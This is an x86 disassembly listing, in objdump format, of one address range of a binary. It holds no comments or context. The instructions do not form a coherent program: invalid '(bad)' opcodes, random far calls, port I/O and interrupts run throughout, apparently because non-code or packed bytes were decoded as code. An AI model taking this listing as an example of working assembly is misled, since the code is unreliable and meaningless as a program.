  404413:	inc    ebp
  404414:	pop    eax
  404415:	cld    
  404416:	mov    ebp,0xfb8d2548
  40441b:	sbb    ebx,eax
  40441d:	jns    0x404455
  40441f:	xchg   ebp,eax
  404421:	or     dh,bl
  404423:	leave  
  404424:	pop    esi
  404425:	scas   al,BYTE PTR es:[edi]
  404426:	outs   dx,BYTE PTR ds:[esi]
  404427:	inc    ebx
  404428:	add    BYTE PTR [ecx-0x3a18d202],cl
  40442e:	test   eax,0x13a9d26c
  404433:	or     bh,BYTE PTR [ebp+0x2f]
  404436:	cmp    ecx,DWORD PTR [ebp+0x40]
  404439:	push   0xffffffc2
  40443b:	repnz pop es
  40443d:	jno    0x404422
  40443f:	push   esi
  404440:	leave  
  404441:	mov    bl,dl
  404443:	pop    eax
  404444:	je     0x404498
  404446:	mov    dh,0x2b
  404448:	xor    al,0xac
  40444a:	call   0x1e46:0x53dbc393
  404451:	cli    
  404452:	adc    eax,ebx
  404454:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404455:	data16 test al,0xce
  404458:	lock jp 0x40445a
  40445b:	cmp    BYTE PTR [ecx],dl
  40445d:	add    ch,cl
  40445f:	adc    BYTE PTR [ecx-0x6f970586],ah
  404465:	ror    BYTE PTR [ebp+ebx*8-0xd61607],1
  40446c:	sbb    bl,dh
  40446e:	cld    
  40446f:	hlt    
  404470:	inc    BYTE PTR [eax+0x151e4b8e]
  404476:	addr16 push eax
  404478:	dec    eax
  404479:	lods   al,BYTE PTR ds:[esi]
  40447a:	ficom  DWORD PTR [edi-0x3a]
  40447d:	lea    ebx,[ebp+0x5bc68c0]
  404483:	cmp    bl,ch
  404485:	adc    bh,BYTE PTR [edx+0x620fd3b9]
  40448b:	in     eax,dx
  40448c:	out    dx,al
  40448d:	xchg   DWORD PTR [eax-0x63],edi
  404490:	das    
  404491:	cmp    eax,0x35131630
  404496:	dec    esp
  404497:	and    al,ch
  404499:	mov    edi,esp
  40449b:	jmp    ecx
  40449d:	popf   
  40449e:	ror    bh,cl
  4044a0:	daa    
  4044a1:	sbb    eax,0x5b5b86b9
  4044a6:	inc    eax
  4044a7:	push   eax
  4044a8:	push   0xb6ec53d5
  4044ad:	repnz xor eax,0xe98212c2
  4044b3:	(bad)  [ecx]
  4044b5:	cs push edx
  4044b7:	dec    edx
  4044b8:	push   edi
  4044b9:	ss sub DWORD PTR es:[eax+0x59],esi
  4044be:	and    ch,bl
  4044c0:	ja     0x404455
  4044c2:	sbb    esi,DWORD PTR [ebx]
  4044c4:	push   0x1990043
  4044c9:	mov    dh,0x7f
  4044cb:	sbb    eax,0x4e8296da
  4044d0:	in     al,dx
  4044d1:	xchg   ebx,eax
  4044d2:	mov    ebp,DWORD PTR [edi+edx*2-0x1c]
  4044d6:	imul   esi,DWORD PTR [ebx+edx*4],0x7
  4044da:	(bad)  
  4044db:	out    dx,eax
  4044dc:	or     eax,0xe9dedd8c
  4044e1:	mov    dl,0x3a
  4044e3:	cmp    DWORD PTR [ebx+0x1d41c80f],esp
  4044e9:	es dec ebx
  4044eb:	repz pop ecx
  4044ed:	add    al,cl
  4044ef:	push   0xd7bf0250
  4044f4:	fisub  DWORD PTR [edx+ebp*2+0x6]
  4044f8:	xchg   ebp,eax
  4044f9:	mov    edi,0x57203cc5
  4044fe:	mov    ds:0xf8865701,al
  404503:	cs jle 0x40454d
  404506:	add    bh,BYTE PTR [edx]
  404508:	das    
  404509:	rol    DWORD PTR [ecx*2+0x3cf72ec2],0x6e
  404511:	popa   
  404512:	push   DWORD PTR [edx-0x53eea3a]
  404518:	xchg   edi,eax
  404519:	and    edx,esp
  40451b:	xchg   edi,eax
  40451c:	(bad)  
  40451d:	loope  0x4044d7
  40451f:	xchg   BYTE PTR [edx+0x3c],ah
  404522:	cmp    esp,0xffffffdd
  404525:	add    cl,BYTE PTR [ebx-0x147b4c99]
  40452b:	adc    al,0x4c
  40452d:	jp     0x404596
  40452f:	mov    dh,0xf2
  404531:	sub    edx,DWORD PTR [ecx]
  404533:	mov    eax,0x8ee0a151
  404538:	jb     0x404565
  40453a:	jbe    0x404537
  40453c:	(bad)  
  40453d:	call   0xd5c3:0x159a452e
  404544:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404545:	mov    edi,0x872f9bd0
  40454a:	jne    0x40459f
  40454c:	adc    ch,BYTE PTR [ebx+eiz*4+0x55]
  404550:	scas   eax,DWORD PTR es:[edi]
  404551:	jb     0x404598
  404553:	ret    0x8b08
  404556:	addr16 aas 
  404558:	and    BYTE PTR [edi-0x1c],dl
  40455b:	sahf   
  40455c:	cmp    edi,ebx
  40455e:	add    eax,0x11c49ce4
  404563:	leave  
  404564:	jae    0x404599
  404566:	dec    ebx
  404567:	pop    ds
  404568:	jp     0x4045e5
  40456a:	int    0xda
  40456c:	mov    eax,0x56054939
  404571:	aaa    
  404572:	or     eax,0xb5217ba1
  404577:	pop    es
  404578:	dec    esi
  404579:	push   edi
  40457a:	pusha  
  40457b:	jmp    0x4045d0
  40457d:	jle    0x4045a1
  40457f:	ss push esp
  404581:	push   ds
  404582:	adc    eax,0x8f392bdf
  404587:	cs and ah,bh
  40458a:	pushf  
  40458b:	mov    ebp,ebp
  40458d:	pop    eax
  40458e:	sti    
  40458f:	add    ch,ch
  404591:	popf   
  404592:	lahf   
  404593:	mov    bl,0xe3
  404595:	pushf  
  404596:	or     BYTE PTR [edi],dl
  404598:	cmp    ah,bh
  40459a:	loope  0x40460e
  40459c:	pop    ebp
  40459d:	add    al,0x2f
  40459f:	jl     0x40458e
  4045a1:	stos   DWORD PTR es:[edi],eax
  4045a2:	jno    0x40459a
  4045a4:	mov    edi,0x2e2a50fd
  4045a9:	cmp    bh,BYTE PTR [edx+0x1a]
  4045ac:	sub    al,0x2
  4045ae:	dec    edx
  4045af:	stc    
  4045b0:	stc    
  4045b1:	fidivr WORD PTR [ebx+0x7e]
  4045b4:	in     eax,dx
  4045b5:	dec    edi
  4045b6:	cld    
  4045b7:	pop    ebp
  4045b8:	add    BYTE PTR [ebp+0x87bac12],ch
  4045be:	in     al,dx
  4045bf:	and    BYTE PTR cs:[edx+edi*2+0x2598267],bl
  4045c7:	aam    0x14
  4045c9:	sahf   
  4045ca:	sbb    esp,DWORD PTR [ecx]
  4045cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045cd:	mov    al,ds:0xc3d68f60
  4045d2:	pop    edi
  4045d3:	mov    DWORD PTR [edi-0x4],edx
  4045d6:	(bad)  
  4045d7:	or     ebx,edx
  4045d9:	mov    ah,0x16
  4045db:	aam    0x7
  4045dd:	cmp    DWORD PTR [edi],edx
  4045df:	pop    edx
  4045e0:	xchg   edx,eax
  4045e1:	xchg   edi,eax
  4045e2:	je     0x40461d
  4045e4:	mov    dh,0xb4
  4045e6:	aaa    
  4045e7:	je     0x40460c
  4045e9:	add    al,0xca
  4045eb:	sbb    eax,0xe9251564
  4045f0:	push   cs
  4045f1:	imul   ecx,DWORD PTR gs:[edx],0xffffffea
  4045f5:	adc    esi,DWORD PTR [eax]
  4045f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045f8:	retf   
  4045f9:	loopne 0x4045f2
  4045fb:	cmp    DWORD PTR [ebx+0x2e],edx
  4045fe:	mov    eax,ds:0x2f5631ac
  404603:	mov    ah,0xcb
  404605:	in     eax,dx
  404606:	inc    ebx
  404607:	mov    ds:0x40d609f6,al
  40460c:	sub    dl,bh
  40460e:	js     0x4045d9
  404610:	and    eax,0x5433c00b
  404615:	add    cl,bh
  404617:	jl     0x404647
  404619:	mov    ds:0xfe6539e5,al
  40461e:	std    
  40461f:	pop    edi
  404620:	add    BYTE PTR [ecx+ecx*4-0x2a],ch
  404624:	scas   eax,DWORD PTR es:[edi]
  404625:	(bad)  
  404626:	test   eax,0x27cab9f7
  40462b:	lods   eax,DWORD PTR ds:[esi]
  40462c:	sbb    al,0x87
  40462e:	(bad)  
  40462f:	int    0x63
  404631:	dec    edx
  404632:	sub    cl,0xb6
  404635:	and    eax,0x93167e24
  40463a:	dec    ecx
  40463b:	push   edx
  40463c:	data16 cmp al,0x27
  40463f:	sti    
  404640:	jle    0x40463b
  404642:	jge    0x4045f7
  404644:	arpl   WORD PTR [eax+0xd],sp
  404647:	mov    ecx,DWORD PTR [ebp-0x38]
  40464a:	pusha  
  40464b:	je     0x404644
  40464d:	and    DWORD PTR [esi-0x33],edi
  404650:	jmp    0x186b9b22
  404655:	fwait
  404656:	xchg   ecx,eax
  404657:	push   ebx
  404658:	mov    esi,0x62bfae2e
  40465d:	sub    esi,esp
  40465f:	iret   
  404660:	cmp    DWORD PTR [ebx],edi
  404662:	stc    
  404663:	sahf   
  404664:	ret    
  404665:	mov    al,0x78
  404667:	mov    eax,DWORD PTR [ebx+ebp*1+0x7e]
  40466b:	dec    esp
  40466c:	fs push ebp
  40466e:	pop    edi
  40466f:	leave  
  404670:	js     0x40462f
  404672:	scas   eax,DWORD PTR es:[edi]
  404673:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404674:	(bad)  
  404676:	arpl   WORD PTR [ebp-0x7a],dx
  404679:	fs lahf 
  40467b:	outs   dx,DWORD PTR ds:[esi]
  40467c:	jg     0x404625
  40467e:	popf   
  40467f:	dec    edi
  404680:	pop    esp
  404681:	jge    0x40462e
  404683:	sbb    DWORD PTR [ecx+0x4d],esi
  404686:	int    0xca
  404688:	dec    esp
  404689:	ficom  WORD PTR [eax+0x36b778b4]
  40468f:	call   DWORD PTR [edx]
  404691:	fist   WORD PTR [ecx+esi*2+0x38]
  404695:	cs pop ebx
  404697:	shr    BYTE PTR [ebp+0x59612281],cl
  40469d:	sbb    DWORD PTR [ebp-0x3c],edi
  4046a0:	xor    DWORD PTR [edx],edx
  4046a2:	jae    0x404671
  4046a4:	push   cs
  4046a5:	pop    ss
  4046a6:	inc    ebp
  4046a7:	sub    BYTE PTR [edi],dl
  4046a9:	mov    dh,0x37
  4046ab:	iret   
  4046ac:	fstp   DWORD PTR [esi+0x2690c73]
  4046b2:	xor    al,0xf8
  4046b4:	pop    ecx
  4046b5:	int3   
  4046b6:	cmp    DWORD PTR [edi+0x7dd8cf9c],esi
  4046bc:	and    ebp,ebx
  4046be:	jle    0x4046e5
  4046c0:	dec    esi
  4046c1:	stc    
  4046c2:	xchg   ax,ax
  4046c4:	adc    DWORD PTR [edx],0xffffff87
  4046c7:	ins    DWORD PTR es:[edi],dx
  4046c8:	mov    edx,0x1e60ba6c
  4046cd:	dec    esi
  4046ce:	or     eax,0x912a203
  4046d3:	shl    DWORD PTR [edx+eax*8-0x4c],1
  4046d7:	std    
  4046d8:	xor    eax,0xafa0e9cf
  4046dd:	adc    al,0x28
  4046df:	aam    0x93
  4046e1:	push   0xfffffff4
  4046e3:	jg     0x4046bc
  4046e5:	pop    es
  4046e6:	int3   
  4046e7:	outs   dx,BYTE PTR ds:[esi]
  4046e8:	mov    DWORD PTR [edx-0x153c05da],eax
  4046ee:	stos   DWORD PTR es:[edi],eax
  4046ef:	dec    ecx
  4046f0:	pop    ss
  4046f1:	scas   al,BYTE PTR es:[edi]
  4046f2:	mov    BYTE PTR [ebp-0x5810986a],ch
  4046f8:	dec    eax
  4046f9:	cmp    DWORD PTR [esi-0x42df58ca],edi
  4046ff:	test   al,0x28
  404701:	mov    bl,0x3
  404703:	inc    esi
  404704:	xchg   BYTE PTR [esi+0x19],ah
  404707:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404708:	into   
  404709:	jne    0x404770
  40470b:	fs test al,0x6e
  40470e:	jbe    0x4046b0
  404710:	sub    ebp,DWORD PTR [edi-0x14]
  404713:	loop   0x404756
  404715:	pop    edx
  404716:	sbb    al,0x36
  404718:	mov    WORD PTR [ebx+0x633df514],fs
  40471e:	jns    0x40476a
  404720:	test   DWORD PTR [ecx-0x41],ecx
  404723:	push   esp
  404724:	xchg   edi,eax
  404725:	mov    esp,0x1df58e8c
  40472a:	or     DWORD PTR ds:0x846d057d,ebx
  404730:	xchg   edx,eax
  404731:	and    ebx,DWORD PTR [edx+edx*8]
  404734:	stos   DWORD PTR es:[edi],eax
  404735:	push   es
  404736:	shl    ah,0xf1
  404739:	jne    0x404740
  40473b:	or     ch,BYTE PTR [edx]
  40473d:	cmp    al,0xdd
  40473f:	outs   dx,BYTE PTR ds:[esi]
  404740:	and    al,0x23
  404742:	inc    edi
  404743:	adc    ch,ch
  404745:	inc    eax
  404746:	dec    edx
  404747:	xor    dh,BYTE PTR [ebx]
  404749:	dec    edi
  40474a:	sub    bl,BYTE PTR [edx+0x58]
  40474d:	xchg   edx,eax
  40474e:	push   ecx
  40474f:	fisub  WORD PTR [ecx]
  404751:	fadd   DWORD PTR [esi]
  404753:	jnp    0x4047a2
  404755:	or     ah,BYTE PTR [ebx-0x10ad7604]
  40475b:	mov    al,0x59
  40475d:	lock and al,0xce
  404760:	scas   eax,DWORD PTR es:[edi]
  404761:	popf   
  404762:	inc    ebx
  404763:	test   DWORD PTR [ebx-0x34],0x539ab1b5
  40476a:	xchg   esp,eax
  40476b:	adc    al,0x69
  40476d:	call   0x4b0a2e05
  404772:	aas    
  404773:	xchg   ecx,eax
  404774:	mov    ds:0xabc4e7ad,al
  404779:	jmp    0x24a5ffbf
  40477e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40477f:	inc    ebx
  404780:	or     ebp,ecx
  404782:	pop    ecx
  404783:	(bad)  
  404784:	inc    edx
  404786:	jo     0x404710
  404788:	xor    eax,0x170662da
  40478d:	nop
  40478e:	popf   
  40478f:	leave  
  404790:	imul   esi,DWORD PTR [ecx+0x56b277d5],0xe1b05cbf
  40479a:	scas   eax,DWORD PTR es:[edi]
  40479b:	sbb    DWORD PTR [esi],eax
  40479d:	das    
  40479e:	rol    BYTE PTR [eax-0x65],cl
  4047a1:	jno    0x404812
  4047a3:	bnd addr16 call 0x80c256c3
  4047aa:	pop    ds
  4047ab:	mov    bh,0x50
  4047ad:	enter  0x8ff8,0xb6
  4047b1:	pop    esp
  4047b2:	jle    0x404780
  4047b4:	dec    edx
  4047b5:	fcomp  DWORD PTR [edx+0x20]
  4047b8:	cmp    ch,cl
  4047ba:	mov    ds:0x46adca0e,al
  4047bf:	xchg   edx,eax
  4047c0:	push   ecx
  4047c1:	rcl    DWORD PTR [ebx+0x1643ae72],1
  4047c7:	pop    ss
  4047c8:	lahf   
  4047c9:	adc    ch,cl
  4047cb:	mov    al,0x1
  4047cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047ce:	in     eax,dx
  4047cf:	or     BYTE PTR [edx-0x7e16ffb9],0xee
  4047d6:	(bad)  [ecx-0x59]
  4047d9:	inc    ebx
  4047da:	or     cl,ch
  4047dc:	idiv   BYTE PTR [ebx+0x1e8a4471]
  4047e2:	mov    ah,bh
  4047e4:	mov    edi,0x15ce420a
  4047e9:	retf   
  4047ea:	pop    ss
  4047eb:	or     edi,esp
  4047ed:	repz inc eax
  4047ef:	jp     0x4047fb
  4047f1:	push   ebp
  4047f2:	pushf  
  4047f3:	sbb    eax,0x72e2c44a
  4047f8:	push   esi
  4047f9:	sub    ebp,DWORD PTR [ecx+eax*8]
  4047fc:	add    al,0x39
  4047fe:	xchg   esp,eax
  4047ff:	or     al,BYTE PTR [ebx+0x31]
  404802:	pop    esi
  404803:	ds loopne 0x404790
  404806:	jmp    0xe4c0:0x899f8873
  40480d:	adc    ah,BYTE PTR [edx-0x2cb2f772]
  404813:	dec    esp
  404814:	jle    0x4047b2
  404816:	mov    esp,0xf5129e87
  40481b:	icebp  
  40481c:	add    ecx,eax
  40481e:	xor    eax,0xd703587c
  404823:	cmp    eax,0x6ba304a1
  404828:	shl    BYTE PTR [esi-0x4db57c0b],0xd5
  40482f:	ja     0x404843
  404831:	mov    cl,0xa7
  404833:	inc    edi
  404834:	daa    
  404835:	and    BYTE PTR [esi],cl
  404837:	push   ss
  404838:	xchg   dh,dl
  40483a:	sti    
  40483b:	mov    al,ds:0xec6dbd99
  404840:	adc    ebx,DWORD PTR [si+0x61ca]
  404845:	adc    ebx,ecx
  404847:	int    0x8f
  404849:	adc    DWORD PTR [ebx-0x73],ecx
  40484c:	imul   DWORD PTR [esi]
  40484e:	mov    bl,0x3e
  404850:	dec    eax
  404851:	xor    al,0xd2
  404853:	or     BYTE PTR [esi+0x77fce864],bl
  404859:	leave  
  40485a:	cs cwde 
  40485c:	push   ds
  40485d:	add    BYTE PTR [edx],0x9c
  404860:	push   ecx
  404861:	leave  
  404862:	repnz sub eax,0xc9859cc4
  404868:	dec    esp
  404869:	test   DWORD PTR [edi],edx
  40486b:	add    eax,ebx
  40486d:	retf   0xe891
  404870:	es inc edi
  404872:	jmp    0x2aee:0xc7da1350
  404879:	cdq    
  40487a:	xchg   ecx,eax
  40487b:	sbb    DWORD PTR [eax+edi*4-0x67fedc87],eax
  404882:	sbb    eax,0x984e694a
  404887:	mov    al,ds:0xf9088a4c
  40488c:	mov    ds:0xda67d880,eax
  404891:	int    0xe0
  404893:	out    0x2f,al
  404895:	daa    
  404896:	aas    
  404897:	xor    ecx,DWORD PTR [edx+0x36c40a58]
  40489d:	mov    cl,0x7
  40489f:	cli    
  4048a0:	data16 cmp dl,ch
  4048a3:	push   es
  4048a4:	fisub  DWORD PTR [ecx]
  4048a6:	shld   DWORD PTR [edx],edi,cl
  4048a9:	mov    bl,0x98
  4048ab:	inc    ebx
  4048ac:	fcomp  DWORD PTR [ebp+0x6f22ab25]
  4048b2:	ret    0x383c
  4048b5:	jbe    0x4048c0
  4048b7:	cli    
  4048b8:	outs   dx,DWORD PTR ds:[esi]
  4048b9:	mov    edx,0x59618ed5
  4048be:	nop
  4048bf:	addr16 cwde 
  4048c1:	cmc    
  4048c2:	test   BYTE PTR [ecx-0x40],al
  4048c5:	and    DWORD PTR [eax+eax*8+0x2],esi
  4048c9:	dec    edx
  4048ca:	test   BYTE PTR [ebp+0x7f],dl
  4048cd:	out    0xf6,al
  4048cf:	xor    eax,ecx
  4048d1:	jge    0x4048a2
  4048d3:	out    dx,eax
  4048d4:	test   DWORD PTR [edi+0x0],0x1d706ef4
  4048db:	fidivr DWORD PTR [ecx-0x3b]
  4048de:	and    BYTE PTR [ebx+edx*1],bl
  4048e1:	adc    eax,0xf6cc817e
  4048e6:	(bad)  
  4048e7:	and    eax,0x247497fe
  4048ec:	and    DWORD PTR gs:[edi+0x1e],0x9d52440f
  4048f4:	push   0x0
  4048f6:	xor    bh,BYTE PTR [ebx+0x2f]
  4048f9:	dec    ebp
  4048fa:	lods   eax,DWORD PTR ds:[esi]
  4048fb:	jno    0x4048b0
  4048fd:	jae    0x4048db
  4048ff:	fwait
  404900:	aaa    
  404901:	fimul  DWORD PTR [esi+edi*8-0x433cd43b]
  404908:	fwait
  404909:	cmp    edx,ebp
  40490b:	or     BYTE PTR [edi+0x3],0x5
  40490f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404910:	in     eax,dx
  404911:	ja     0x404938
  404913:	es js  0x40494f
  404916:	jb     0x4048b6
  404918:	or     eax,DWORD PTR [edx-0x7fd82d81]
  40491e:	lods   al,BYTE PTR ds:[esi]
  40491f:	das    
  404920:	iret   
  404921:	aas    
  404922:	addr16 mov esi,0xd8377387
  404928:	and    al,0xbf
  40492a:	xor    DWORD PTR [eax+0x70f29ca6],ebp
  404930:	add    esp,DWORD PTR [eax]
  404932:	shl    BYTE PTR [esi-0x951bd7e],1
  404938:	(bad)  
  40493a:	dec    ebp
  40493b:	call   0xdd08:0xbf6c2e3f
  404942:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404943:	xchg   ah,al
  404945:	jb     0x40495b
  404947:	sub    al,0x4e
  404949:	dec    esp
  40494a:	gs (bad) 
  40494c:	in     al,dx
  40494d:	or     ebx,DWORD PTR [ecx+eiz*4+0x26639d5d]
  404954:	test   al,0x3b
  404956:	neg    BYTE PTR [ebp-0x16]
  404959:	ins    BYTE PTR es:[edi],dx
  40495a:	fcomp  DWORD PTR [edx]
  40495c:	cmp    ecx,DWORD PTR [edi]
  40495e:	inc    esi
  40495f:	inc    edi
  404960:	test   edx,esi
  404962:	jle    0x40494f
  404964:	(bad)  [ebp-0x5488fb04]
  40496a:	mov    ds:0xce620eae,eax
  40496f:	adc    ebp,DWORD PTR [edi+0x6f7ae63]
  404975:	js     0x4049be
  404977:	shr    DWORD PTR [ebx+0x680e5913],1
  40497d:	xor    edi,DWORD PTR [edx+0x2e]
  404980:	inc    ebx
  404981:	mov    al,0x32
  404983:	push   ebx
  404984:	scas   al,BYTE PTR es:[edi]
  404985:	xchg   DWORD PTR [ebx],ebp
  404987:	icebp  
  404988:	mov    ah,al
  40498a:	cmp    ecx,DWORD PTR [ecx+eiz*8]
  40498d:	mov    WORD PTR [ebp-0x44],ss
  404990:	leave  
  404991:	stc    
  404992:	mov    ds:0x3bb40b49,eax
  404997:	pusha  
  404998:	stc    
  404999:	xchg   DWORD PTR [ebx+0x356beb67],ecx
  40499f:	outs   dx,BYTE PTR ds:[esi]
  4049a0:	add    eax,0x72423247
  4049a5:	out    0x56,eax
  4049a7:	sub    al,0x89
  4049a9:	cmp    cl,BYTE PTR ds:[ebx+0x3ffa1149]
  4049b0:	aad    0x88
  4049b2:	or     ebx,ebx
  4049b4:	test   al,0x7f
  4049b6:	stc    
  4049b7:	pop    ecx
  4049b8:	xchg   bl,cl
  4049ba:	sbb    edx,0x1e
  4049bd:	and    DWORD PTR [edi-0x7f],ebp
  4049c0:	bound  edx,QWORD PTR ds:0x44975e9b
  4049c6:	dec    ecx
  4049c7:	inc    esi
  4049c8:	jl     0x404a32
  4049ca:	ins    DWORD PTR es:[edi],dx
  4049cb:	add    BYTE PTR [edx+0x3df13224],dh
  4049d1:	xor    BYTE PTR [ecx],al
  4049d3:	idiv   DWORD PTR [edx+0x5ebc9fd]
  4049d9:	pop    esi
  4049da:	out    dx,eax
  4049db:	dec    ebx
  4049dc:	pop    ebx
  4049dd:	push   ebx
  4049de:	and    eax,edx
  4049e0:	ficom  DWORD PTR [edi]
  4049e2:	or     eax,0xbc978e50
  4049e7:	pop    ds
  4049e8:	push   es
  4049e9:	mov    WORD PTR [edi-0x649a8f41],ds
  4049ef:	sub    al,0xdf
  4049f1:	sbb    BYTE PTR [esi],bl
  4049f3:	inc    esp
  4049f4:	retf   
  4049f5:	ret    0x7ea5
  4049f8:	push   es
  4049f9:	mov    esi,DWORD PTR [esi]
  4049fb:	mov    edx,0xe202ff00
  404a00:	(bad)  
  404a01:	fmul   st(2),st
  404a03:	jge    0x404a66
  404a05:	sbb    al,BYTE PTR [esi-0x333047f2]
  404a0b:	std    
  404a0c:	pop    esp
  404a0d:	xchg   BYTE PTR [ebx],cl
  404a0f:	push   0xd228fa9b
  404a14:	retf   
  404a15:	inc    ebp
  404a16:	cld    
  404a17:	xchg   esp,eax
  404a18:	adc    dl,cl
  404a1a:	std    
  404a1b:	xchg   BYTE PTR ds:0x47039c9c,cl
  404a21:	sub    al,0x23
  404a23:	sub    eax,0xca89a687
  404a28:	addr16 dec eax
  404a2a:	in     al,0x9b
  404a2c:	test   eax,0x501ca5f7
  404a31:	push   es
  404a32:	stc    
  404a33:	cmc    
  404a34:	shl    DWORD PTR [ebx],cl
  404a36:	push   edx
  404a37:	adc    al,BYTE PTR [ebx-0x65d4e4f4]
  404a3d:	test   eax,0xf526fe70
  404a42:	fst    st(5)
  404a45:	cmp    dh,dl
  404a47:	push   0x9fd36c9b
  404a4c:	data16 int 0x63
  404a4f:	mov    dh,0x61
  404a51:	test   eax,0x36532ae0
  404a56:	dec    ecx
  404a57:	stos   DWORD PTR es:[edi],eax
  404a58:	(bad)  
  404a59:	cmp    ebp,eax
  404a5b:	or     BYTE PTR [ecx+esi*2],ch
  404a5e:	fld    DWORD PTR [ebx-0x28e94dea]
  404a64:	outs   dx,DWORD PTR ds:[esi]
  404a65:	into   
  404a66:	mov    ch,0xab
  404a68:	or     al,0x2c
  404a6a:	jb     0x404abd
  404a6c:	clc    
  404a6d:	call   0x59af:0xa96907d6
  404a74:	mov    eax,0xd141f67c
  404a79:	mov    cl,0xbf
  404a7b:	pop    ds
  404a7c:	fs mov al,ah
  404a7f:	jle    0x404af3
  404a81:	xlat   BYTE PTR ds:[ebx]
  404a82:	xchg   edx,eax
  404a83:	mov    BYTE PTR [ebp+0xcc6cf97],0x74
  404a8a:	loope  0x404a71
  404a8c:	cdq    
  404a8d:	jge    0x404a84
  404a8f:	pop    ds
  404a90:	mov    ch,0x56
  404a92:	inc    edi
  404a93:	jmp    FWORD PTR [edx+0x66]
  404a96:	jp     0x404a80
  404a98:	sub    edi,DWORD PTR [esi+0x46]
  404a9b:	test   BYTE PTR [esi+0x49],bl
  404a9e:	cs lock stos BYTE PTR es:[edi],al
  404aa1:	out    dx,eax
  404aa2:	fs stc 
  404aa4:	pop    es
  404aa5:	xor    esi,DWORD PTR [edi-0x61]
  404aa8:	(bad)  
  404aa9:	cmc    
  404aaa:	add    DWORD PTR [eax+edx*8-0x13ff72ab],eax
  404ab1:	cld    
  404ab2:	mov    WORD PTR [esi+0x699dbd45],ds
  404ab8:	les    esi,FWORD PTR [edx+0x23]
  404abb:	test   DWORD PTR [edi-0x69043bd5],ebp
  404ac1:	mov    ah,0xd9
  404ac3:	rcl    BYTE PTR [edx-0x57],cl
  404ac6:	sub    eax,0x31ead08d
  404acb:	(bad)  
  404acc:	sub    dl,BYTE PTR [edx-0x50a249f4]
  404ad2:	ds (bad) 
  404ad4:	or     DWORD PTR [edi+0x5295ae7e],edx
  404ada:	nop
  404adb:	das    
  404adc:	mov    ebp,0xf0427e86
  404ae1:	in     al,dx
  404ae2:	jno    0x404abd
  404ae4:	je     0x404b2e
  404ae6:	jmp    0xbcb3:0xd51772a
  404aed:	cmp    DWORD PTR [ebp+0x161777dd],0x424b94c8
  404af7:	nop
  404af8:	imul   esi,edi,0x2a6c199a
  404afe:	and    esi,DWORD PTR [eax+0x7b]
  404b01:	pusha  
  404b02:	inc    eax
  404b03:	les    ebx,FWORD PTR [esi+ecx*8-0x65]
  404b07:	cdq    
  404b08:	jae    0x404ac8
  404b0a:	push   edx
  404b0b:	jo     0x404af6
  404b0d:	inc    ecx
  404b0e:	pop    esi
  404b0f:	(bad)  
  404b10:	fcomp  st(6)
  404b12:	mov    ebx,0xb2838afd
  404b17:	test   BYTE PTR [ebx],0x85
  404b1a:	mov    DWORD PTR [edx],ebp
  404b1c:	sbb    eax,0x99a6edf6
  404b21:	pop    ebx
  404b22:	inc    esi
  404b23:	push   edi
  404b24:	mov    esp,0x5bca1852
  404b29:	imul   esp,DWORD PTR [edi+0x24],0xbdcc3f7c
  404b30:	test   al,0x9b
  404b32:	fldcw  WORD PTR [edi+0x68]
  404b35:	call   0x32f6014e
  404b3a:	mov    edi,0xd6eb7778
  404b3f:	test   BYTE PTR [edi],cl
  404b41:	mov    eax,DWORD PTR [eax]
  404b43:	sub    bl,BYTE PTR [edx-0x7abc833a]
  404b49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b4a:	addr16 imul esi,eax,0xbbef88bf
  404b51:	cdq    
  404b52:	das    
  404b53:	aaa    
  404b54:	mov    cl,0xbe
  404b56:	cwde   
  404b57:	and    BYTE PTR ds:0xe5737bb7,0x19
  404b5e:	mov    ah,0x8d
  404b60:	repz cmp al,0xaa
  404b63:	mov    cl,0x4e
  404b65:	or     DWORD PTR [edx],eax
  404b67:	repz xchg edx,eax
  404b69:	and    BYTE PTR [edi-0x34],dh
  404b6c:	or     bl,BYTE PTR [ebx]
  404b6e:	jecxz  0x404bde
  404b70:	dec    esi
  404b71:	ins    DWORD PTR es:[edi],dx
  404b72:	fnstenv [ebx]
  404b74:	sub    BYTE PTR [esi-0x32c90885],0xfd
  404b7b:	jmp    FWORD PTR [eax-0x32]
  404b7e:	leave  
  404b7f:	mov    al,ds:0xf408db26
  404b84:	mov    eax,ds:0x2796cfb7
  404b89:	push   ebx
  404b8a:	xchg   esi,eax
  404b8b:	out    0x25,eax
  404b8d:	dec    edx
  404b8e:	out    0x84,eax
  404b90:	inc    ebp
  404b91:	push   edi
  404b92:	pop    es
  404b93:	jmp    ebp
  404b95:	out    dx,eax
  404b96:	test   eax,0x71b961e
  404b9b:	inc    esi
  404b9c:	pop    ss
  404b9d:	sub    al,ch
  404b9f:	mov    cs,WORD PTR [esi-0x252f3bcf]
  404ba5:	jb     0x404b37
  404ba7:	inc    esp
  404ba8:	hlt    
  404ba9:	aas    
  404baa:	test   al,0xdb
  404bac:	xlat   BYTE PTR ds:[ebx]
  404bad:	sub    DWORD PTR [ecx+0x59730a3f],0x22be8508
  404bb7:	jmp    0x404b98
  404bb9:	sub    dl,al
  404bbb:	imul   ebp,DWORD PTR [eax],0x2b
  404bbe:	push   edi
  404bbf:	clc    
  404bc0:	ss stc 
  404bc2:	inc    edx
  404bc3:	mov    cl,0x2d
  404bc5:	test   DWORD PTR [ebx+esi*4],ebp
  404bc8:	mov    ds:0x98ec477,al
  404bcd:	jecxz  0x404bed
  404bcf:	pop    eax
  404bd0:	inc    ecx
  404bd1:	jmp    0x404c43
  404bd3:	push   es
  404bd4:	ja     0x404be6
  404bd6:	pop    edi
  404bd7:	jl     0x404bd3
  404bd9:	xchg   ecx,eax
  404bda:	inc    edi
  404bdb:	mov    dh,0xf0
  404bdd:	leave  
  404bde:	(bad)  
  404bdf:	xor    al,0xda
  404be1:	aaa    
  404be2:	add    al,0xe9
  404be4:	push   cs
  404be5:	jg     0x404bb5
  404be7:	call   0x4d78:0x354aad1f
  404bee:	mov    eax,0xd997c8d0
